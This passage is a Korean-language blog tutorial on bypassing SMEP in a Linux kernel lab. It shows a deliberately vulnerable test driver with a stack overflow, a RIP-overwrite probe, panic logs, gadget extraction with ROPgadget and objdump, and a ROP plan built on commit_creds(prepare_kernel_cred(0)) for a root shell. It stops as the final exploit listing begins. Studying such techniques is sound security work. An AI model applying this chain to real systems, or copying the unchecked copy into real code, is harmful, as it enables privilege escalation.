

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="G4EG4EGAE">
  <meta name="keywords" content="">
  
  <title>[Research] Linux Kernel Exploit - Bypassing SMEP - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>G4EG4EG4E's TECHNOTE</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="[Research] Linux Kernel Exploit - Bypassing SMEP">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-09-30 02:47" pubdate>
        September 30, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      52
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Linux Kernel Exploit - Bypassing SMEP</h1>
            
            <div class="markdown-body">
              <h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMEP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMEP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMEP"></a>[Research] Linux Kernel Exploit - Bypassing SMEP</h2><p><img src="/img/penguinshot.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 해당 포스트에서는 SMEP 보호기법을 주제로 하여 해당 보호기법이 어떠한 보호기법인지 이해하고 이를 우회하여 공격하는 방법을 작성하려고 한다.</p>
</br>
</br>

<h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>SMEP(Supervisor Mode Execution Prevention)은 supervisor mode(ring0)에서 특정 주소에 있는 명령어를 fetch할 경우 해당 주소가 만약 user mode(ring3)에서 접근가능한 주소라면 fetch하지 않게 하는 보호기법이다. </p>
<p>단순한 정의를 내리는 것에 갇히지 않고 내가 이해한 내용으로 해당 기법을 작성하면 SMEP은 유저영역에 NX bit와 유사하다는 느낌이 들었다. 지난 포스팅에서는 페이로드가 디바이스 드라이버를 제어하는 코드에 있었다. SMEP이 적용되어 있다면 다음과 같은 형태의 공격은 불가능하다. </p>
<pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ls
bin      etc      init     linuxrc  root     sys      tmp
dev      exp      lib      proc     sbin     test.ko  usr
/ $ ./exp 
[    4.728265] unable to execute userspace code (SMEP?) (uid: 1000)
[    4.729769] BUG: unable to handle page fault for address: 0000000000400c54
[    4.733079] #PF: supervisor instruction fetch in kernel mode
[    4.734208] #PF: error_code(0x0011) - permissions violation
[    4.735407] PGD 1d954067 P4D 1d954067 PUD 1d958067 PMD 1d94c067 PTE 1dc30025
[    4.737038] Oops: 0011 [#1] SMP NOPTI
[    4.738022] CPU: 0 PID: 70 Comm: exp Tainted: G           O      5.8.5 #1
[    4.738838] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    4.739732] RIP: 0010:0x400c54
[    4.740234] Code: Bad RIP value.
[    4.740527] RSP: 0018:ffffc9000019feb8 EFLAGS: 00000246
[    4.740937] RAX: 0000000000400c54 RBX: 0000000000000008 RCX: 0000000000000000
[    4.741387] RDX: 0000000000000000 RSI: 00007ffe415d0348 RDI: ffffc9000019fec8
[    4.741846] RBP: ffff88801d91e900 R08: 0000000000400c54 R09: 0000000000000000
[    4.742300] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[    4.742802] R13: 0000000000000008 R14: ffffc9000019ff10 R15: 00007ffe415d0340
[    4.743299] FS:  00000000018a3880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000
[    4.743928] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.744355] CR2: 0000000000400c54 CR3: 000000001d972000 CR4: 00000000001006f0
[    4.744946] Call Trace:
[    4.746173]  ? test_write+0x32/0x50 [test]
[    4.747038]  ? vfs_write+0xc2/0x1f0
[    4.747557]  ? ksys_write+0x5a/0xd0
[    4.751948]  ? do_syscall_64+0x3e/0x70
[    4.753504]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    4.754301] Modules linked in: test(O)
[    4.755895] CR2: 0000000000400c54
[    4.758935] ---[ end trace 5a1c612f112c704d ]---
[    4.759909] RIP: 0010:0x400c54
[    4.760269] Code: Bad RIP value.
[    4.760478] RSP: 0018:ffffc9000019feb8 EFLAGS: 00000246
[    4.760915] RAX: 0000000000400c54 RBX: 0000000000000008 RCX: 0000000000000000
[    4.761419] RDX: 0000000000000000 RSI: 00007ffe415d0348 RDI: ffffc9000019fec8
[    4.761869] RBP: ffff88801d91e900 R08: 0000000000400c54 R09: 0000000000000000
[    4.762291] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[    4.762884] R13: 0000000000000008 R14: ffffc9000019ff10 R15: 00007ffe415d0340
[    4.763462] FS:  00000000018a3880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000
[    4.763968] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.764323] CR2: 0000000000400c54 CR3: 000000001d972000 CR4: 00000000001006f0
[    4.764956] Kernel panic - not syncing: Fatal exception
[    4.766565] Kernel Offset: disabled
[    4.767284] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
</code></pre>
<p>다음과 같이 smep이 적용된 리눅스 환경에서 유저영역에서의 페이로드를 실행시킬 경우 다음과 같은 문제가 발생한다.</p>
</br>

<p><img src="/img/cr4.PNG" srcset="/img/loading.gif" lazyload></p>
<p>SMEP은 CPU의 CR4 Register의 SMEP에 해당하는 부분의 비트를 키거나 끔으로 적용이 가능하다. 그렇다면 다음과 같은 생각을 할 수 있다. 세상이 그렇게 간단하진 않지만 공격자가 CR4 레지스터의 원하는 부분을 제어(control)할 수 있다면 SMEP을 우회할 수 있지 않을까라는 생각을 했었고 자료조사 결과 실제로 이러한 공격기법을 이용할 수 있다는 결론를 얻었다. 하지만 해당 포스트에서는 보다 범용적인 Kernel기반의 ROP를 이용해서 우회할 예정이다. </p>
<pre><code>백문이 불여일격, 실제 바이너리를 통해 해당 공격을 적용해보겠다.
</code></pre>
<p></br></br></p>
<h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep \
</code></pre>
<p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 확인해야 하는 부분은 해당 포스트의 목적은 SMEP우회를 주목적으로 하기에 KASLR을 비활성화 해두었으며 CPU 옵션에는 SMEP이 적용되어 있는 것을 확인할 수 있다.</p>
<p></br></br></p>
<h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure>

<p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p>
<p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_write() 함수가 실행된다. 해당 함수가 실행될 경우 line30~line33에 의하여 커널에서 메모리를 동적할당한 후 유저영역에서의 메모리를 해당 데이터의 크기만큼 복사하는 것을 확인할 수 있다.</p>
<p>이를 고려해보면 사용자가 입력한 데이터(untrusted input)의 크기를 제한하지 않는 문제로 인해서 스택 버퍼기반의 오버플로우가 발생할 것으로 예상된다.</p>
<p></br></br></p>
<h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p>
</br>

<h3 id="공격-코드"><a href="#공격-코드" class="headerlink" title="공격 코드"></a>공격 코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">//gcc -masm=intel -static -o exp exp.c -no-pie<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Generate Payload<br>    size_t payload[18] = &#123;0, &#125;;<br><br>    memset(payload, 0x41, 8);<br>    memset(payload+1, 0x42, 8);<br>    memset(payload+2, 0x43, 8);<br>    memset(payload+3, 0x44, 8);<br>    memset(payload+4, 0x45, 8);<br>    memset(payload+5, 0x46, 8);<br>    memset(payload+6, 0x47, 8);<br>    memset(payload+7, 0x48, 8);<br>    memset(payload+9, 0x49, 8);<br><br><br>    // STEP2. Exploit<br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>디바이스 드라이버를 제어하는 코드를 작성하였다. 버퍼에 데이터를 어느정도 작성해야 Return Address를 컨트롤 할 수 있는가를 파악하기 위해서 연속적인 형태의 입력인 “AAA…ABBB.B…”를 입력하였다. 만약 RIP가 해당 입력값 중 하나의 값으로 변조된다면 이는 사용자의 입력으로 실행흐름을 변조할 수 있는 취약점으로 볼 수 있다. 참고로 스택 카나리는 비활성화 상태이다.</p>
<h3 id="공격-결과"><a href="#공격-결과" class="headerlink" title="공격 결과"></a>공격 결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./exploit 
[    5.999472] arr : 0
[    5.999788] general protection fault: 0000 [#1] SMP NOPTI
[    6.001957] CPU: 0 PID: 70 Comm: exploit Tainted: G           O      5.8.5 #1
[    6.006606] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    6.009067] RIP: 0010:0x4545454545454545
[    6.010246] Code: Bad RIP value.
[    6.010565] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    6.011006] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261
[    6.011471] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    6.011960] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007
[    6.012544] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 4444444444444444
[    6.013009] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff970c7710
[    6.013527] FS:  0000000000d43880(0000) GS:ffff88801ee00000(0000) knlGS:0000000000000000
[    6.014132] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    6.014516] CR2: 000000000045a040 CR3: 000000001d10e000 CR4: 00000000001006f0
[    6.015070] Call Trace:
[    6.015986]  ? do_syscall_64+0x3e/0x70
[    6.016964]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    6.017975] Modules linked in: test(O)
[    6.019737] ---[ end trace 543408c634e8da58 ]---
[    6.024399] RIP: 0010:0x4545454545454545
[    6.024920] Code: Bad RIP value.
[    6.026318] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    6.026874] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261
[    6.027339] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    6.028103] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007
[    6.029610] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 4444444444444444
[    6.030238] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff970c7710
[    6.030691] FS:  0000000000d43880(0000) GS:ffff88801ee00000(0000) knlGS:0000000000000000
[    6.031616] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    6.032050] CR2: 000000000045a040 CR3: 000000001d10e000 CR4: 00000000001006f0
[    6.032733] Kernel panic - not syncing: Fatal exception
[    6.033544] Kernel Offset: disabled
[    6.034313] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
</code></pre>
<p>해당 결과를 통해 RIP가 0x4545454545454545로 변조되었음을 확인할 수 있었고 해당 값은 사용자가 입력할 버퍼의 32만큼의 입력한 뒤의 값이다. 그러므로 payload[4]에 값을 작성할 경우 해당 값으로 실행흐름을 변조할 수 있다.</p>
<p></br></br></p>
<h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p>
<p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p>
<h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승
STEP2. 사용자 모드(user mode)로의 전환
STEP3. shell 획득
</code></pre>
<p>다음의 시나리오는 SMEP이 적용되어 있지 않은 일반적인 형태의 공격(exploit)과 유사하다. Memory Randomization이 적용되어 있지 않기 때문에 실행시키고자 하는 함수인 commit_creds(), prepare_kernel_cred()를 하드코딩하여 값을 작성해도 된다.</p>
<p>여기서 고려해야하는 사항은 슈퍼바이저 모드(ring0)에서 유저영역의 payload를 실행할 수 없기 때문에 권한 상승을 commit_creds(prepare_kernel_cred(0)) 일으킨 후 유저 모드로 전환하는 과정을 커널에서 진행해야 한다. 결과적으로 이러한 과정은 Kernel ROP를 통해 ROP Payload에서 수행할 수 있다.</p>
<h3 id="가젯-구성"><a href="#가젯-구성" class="headerlink" title="가젯 구성"></a>가젯 구성</h3><p><img src="/img/calling_convetion.PNG" srcset="/img/loading.gif" lazyload alt="Linux 64bit - calling convention"></p>
<p>ROP Payload를 작성하기에 앞서 commit_creds()와 prepare_kernel_cred(NULL)을 수행해야 하기에 현재의 아키텍쳐(intel x86/64)에서 함수 호출규약을 확인해볼 필요가 있다. 함수를 호출할 인자가 RDI, RSI, RDX, RCX, R8, R9, stack을 기반으로 하여 전달되는 것을 확인할 수 있다. 그리고 상단의 그림에서는 언급되어 있지 않지만 prepare_kernel_cred() 함수의 반환값의 경우는 RAX에 담긴다. 이러한 과정을 통해서 가젯을 구성할 수 있다.</p>
</br>


<pre><code>prepare_kernel_cred() [RDI:0]
mov rdi, rax
commit_creds() [RDI: 결과값]
swapgs
iretq
</code></pre>
<p>대략적으로 다음과 같은 형태로 명령어가 수행되어야 한다. prepare_kernel_cred()를 호출할 경우 첫 번째 인자인 RDI의 경우 0(NULL)로 세팅되어 있어야 하며 해당 함수의 반환값이 commit_creds() 함수의 첫 번째인자로 구성되어야 한다. 이후 다시 유저모드의 전환이 일어나야 한다.</p>
<h3 id="가젯-추출"><a href="#가젯-추출" class="headerlink" title="가젯 추출"></a>가젯 추출</h3><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rdi&quot; | grep -a2 &quot;ret&quot;
ffffffff813fb9bb:    5a                       pop    rdx
ffffffff813fb9bc:    5f                       pop    rdi
ffffffff813fb9bd:    c3                       ret     
</code></pre>
</br>

<pre><code>$ ROPgadget --binary vmlinux | grep &quot;mov rdi, rax&quot;
0xffffffff82a081f0 : mov rdi, rax ; rep movsd dword ptr [rdi], dword ptr [rsi] ; ret
0xffffffff81132ad8 : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff81132970
0xffffffff81b2413b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
</code></pre>
</br>

<pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rcx&quot; | grep -a2 &quot;ret&quot;
ffffffff81057091:    8b 44 24 04              mov    eax,DWORD PTR [rsp+0x4]
ffffffff81057095:    59                       pop    rcx
ffffffff81057096:    c3                       ret    
--
ffffffff8105c7bb:    e8 20 fd ff ff           call   0xffffffff8105c4e0
--
ffffffff8119a9f1:    5a                       pop    rdx
ffffffff8119a9f2:    59                       pop    rcx
ffffffff8119a9f3:    c3                       ret    
--
ffffffff8119ab2b:    5a                       pop    rdx
--
ffffffff8119acd6:    5a                       pop    rdx
ffffffff8119acd7:    59                       pop    rcx
ffffffff8119acd8:    c3                       ret   
</code></pre>
</br>

<pre><code>$ ROPgadget --binary vmlinux | grep &quot;swapgs&quot;
0xffffffff81c00f57 : nop ; swapgs ; ret
</code></pre>
</br>

<pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;iretq&quot;
ffffffff810252ad:    68 b4 52 02 81           push   0xffffffff810252b4
ffffffff810252b2:    48 cf                    iretq  
ffffffff810252b4:    c3                       ret 
</code></pre>
<p>다음과 같은 형태로 vmlinux에서 공격 페이로드를 구성할 가젯을 추출할 수 있었다. 중간에 언급하지 않았던 <b>pop rcx</b> 가젯을 추출하였는 데, 해당 이유는 <b>rep movsq qword ptr [rdi], qword ptr [rsi]</b> 다음의 명령어 때문이다. 해당 명령어는 rsi에 있는 데이터를 rdi에 복사하는 형태의 명령어이며 반복횟수는 rcx 명령어로 결정된다. 그러므로 해당 명령어를 유효하지 않게 하기 위해서는 rcx를 0으로 세팅할 필요가 있다.</p>
</br>

<h3 id="공격코드"><a href="#공격코드" class="headerlink" title="공격코드"></a>공격코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 